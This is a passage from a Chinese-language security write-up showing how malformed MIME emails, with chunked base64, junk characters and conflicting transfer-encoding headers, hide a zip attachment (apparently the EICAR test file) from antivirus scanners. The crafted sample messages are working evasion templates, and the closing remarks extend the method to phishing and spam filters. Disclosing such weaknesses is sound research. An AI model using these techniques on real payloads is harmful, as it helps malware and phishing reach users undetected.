    Virus attached
    --foo
    Content-type: application/zip; name=whatever.zip
    Content-Transfer-Encoding: base64
    Content-Transfer-Encoding: quoted-printable
    U.E.s.D.B.B.Q.A.A.g.A.I.A.B.F.K.j.k.k.8.z.1.F.o.R.g.A.A.A.E.Q.
    A.A.A.A.J.A.A.A.A.Z.W.l.j.Y.X.I.u.Y.2.9.t.i.z.D.1.V.w.x.Q.d.X.
    A.M.i.D.a.J.C.Y.i.K.M.D.X.R.C.I.j.T.N.H.d.2.1.
    j.S.v.V.X.H.1.d.H.Y.M.0.g.0.O.c.f
    .R.z.c.Q.x.y.0.X.X.0.C./.E.M.8.w.w.K.D.d.Y.N.c.Q.0.O.0.X.X.z.
    9.H.F.V.V.P.H.Q.9.t.A.C.A.F.B.L.A.Q.I.U.
    A.x.Q.A.A.g.A.I.A.B.F.K.j.k.k.8.z.1.F.o.R.g.A.A.A.E.Q
    .A.A.A.A.J.A.A.A.A.A.A.A.A.A.A.A.A.A.A.C.2.g.Q.A.A.A.A.B.l.a.
    W.N.h.c.i.5.j.b.2.1.Q.S.w.U.G.A.A.A.A.
    A.A.E.A.A.Q.A.3.A.A.A.A.b.Q.A.A.A.A.A.A. 
    --foo--
请注意，这并不意味着所有受影响的产品都无法处理Base64中的垃圾字符。更有可能的是，这些产品中的大部分在步骤2中就没能检测出原始的内容传输编码中的恶意软件，然后，又继续用启发式检测方法来处理Base64编码。由于这里添加了垃圾字符，致使启发式检测方法失效。
**第4步：块式Base64编码**
* * *
在这里，我们退一步，不再使用垃圾字符。相反，我们将使用其他方式来攻击Base64编码：一次正确的编码总是需要3个输入字符，并将它们编码为4个输出字符。即使最后只剩下一个或两个输入字符，输出也仍然是4个字符，并通过“==”（一个输入字符时）或“=”（两个输入字符时）进行填充。
这意味着“=”或“==”只应出现在编码数据的末尾。因此，一些解码器遇到第一个“=”就会停止解码，而另一些则继续前进。例如，Thunderbird总是读取4个字节的编码数据并对其进行解码，并且即使中间编码数据中出现了"="，也不会改变其行为。由此萌生了不要总是每次对3个字符进行编码，而是一次只编码2个字符的想法，这样的话，就会在编码数据中留下许多的“=”。Thunderbird将像处理原始邮件一样处理该邮件，但Virustotal网站上面能够检测出恶意软件的杀软数量将从36下降为1：
    From: PI:EMAIL
    To: PI:EMAIL
    Subject: Base64 encoded in small chunks instead one piece + contradicting CTE
    Content-type: multipart/mixed; boundary=foo
    --foo
    Content-type: text/plain
    Virus attached
    --foo
    Content-type: application/zip; name=whatever.zip
    Content-Transfer-Encoding: base64
    Content-Transfer-Encoding: quoted-printable
    UEs=AwQ=FAA=AgA=CAA=EUo=jkk=PM8=UWg=RgA=AAA=RAA=AAA=CQA=AAA=ZWk=Y2E=ci4=
    Y28=bYs=MPU=Vww=UHU=cAw=iDY=iQk=iIo=MDU=0Qg=iNM=NHc=dtY=NK8=VXE=9XQ=dgw=
    0g0=DnE=9HM=cQw=ctE=dfQ=C/E=DPM=DAo=DdY=DXE=DQ4=0XU=8/Q=cVU=VPE=0PY=0AI=
    AFA=SwE=AhQ=AxQ=AAI=AAg=ABE=So4=STw=z1E=aEY=AAA=AEQ=AAA=AAk=AAA=AAA=AAA=
    AAA=AAA=ALY=gQA=AAA=AGU=aWM=YXI=LmM=b20=UEs=BQY=AAA=AAA=AQA=AQA=NwA=AAA=
    bQA=AAA=AAA=
    --foo--
**第5步：再次使用垃圾字符**
* * *
为了进行混淆处理，我们将再次添加垃圾字符。这样一来，就能够成功地将检测率从36降为0：
    From: PI:EMAIL
    To: PI:EMAIL
    Subject: chunked Base64 combined with junk characters and contradicting CTE
    Content-type: multipart/mixed; boundary=foo
    --foo
    Content-type: text/plain
    Virus attached
    --foo
    Content-type: application/zip; name=whatever.zip
    Content-Transfer-Encoding: base64
    Content-Transfer-Encoding: quoted-printable
    UEs=.AwQ=.FAA=.AgA=.CAA=.EUo=.jkk=.PM8=.UWg=.RgA=.AAA=.RAA=.AAA=.CQA=.AAA=.
    ZWk=.Y2E=.ci4=.Y28=.bYs=.MPU=.Vww=.UHU=.cAw=.iDY=.iQk=.iIo=.MDU=.0Qg=.iNM=.
    NHc=.dtY=.NK8=.VXE=.9XQ=.dgw=.0g0=.DnE=.9HM=.cQw=.ctE=.dfQ=.C/E=.DPM=.DAo=.
    DdY=.DXE=.DQ4=.0XU=.8/Q=.cVU=.VPE=.0PY=.0AI=.AFA=.SwE=.AhQ=.AxQ=.AAI=.AAg=.
    ABE=.So4=.STw=.z1E=.aEY=.AAA=.AEQ=.AAA=.AAk=.AAA=.AAA=.AAA=.AAA=.AAA=.ALY=.
    gQA=.AAA=.AGU=.aWM=.YXI=.LmM=.b20=.UEs=.BQY=.AAA=.AAA=.AQA=.AQA=.NwA=.AAA=.
    bQA=.AAA=.AAA=.
    --foo--
**结束语**
* * *
如果我们只要通过在恶意软件的传输上面做手脚，就能实现广为人知的恶意软件的免杀的话，那为什么要在恶意软件本身上费劲呢？通过利用MIME标准的不同实现对异常或无效数据产生的不同解释，就能够让分析系统对数据的真实含义视而不见。
请注意，这篇文章介绍的免杀方法，只是各种可行手段中的极小一部分。除此之外，我还发现许多的绕过方法，有的方法是针对内容分析的，有的是令杀软无法从附件中正确提取文件名的。当然，利用MIME的情形与在利用HTTP中描述的情况差不多。
此外，这些方法不仅限于干扰恶意软件的分析工作。如果将这些方法应用于向用户显示的文本内容上面，它们还可用于干扰网络钓鱼和垃圾邮件的检测。例如，它们可用于让分析软件看到的是乱码，或使其分析错误的MIME部分，但将邮件显示给最终用户时，则显示正常的内容。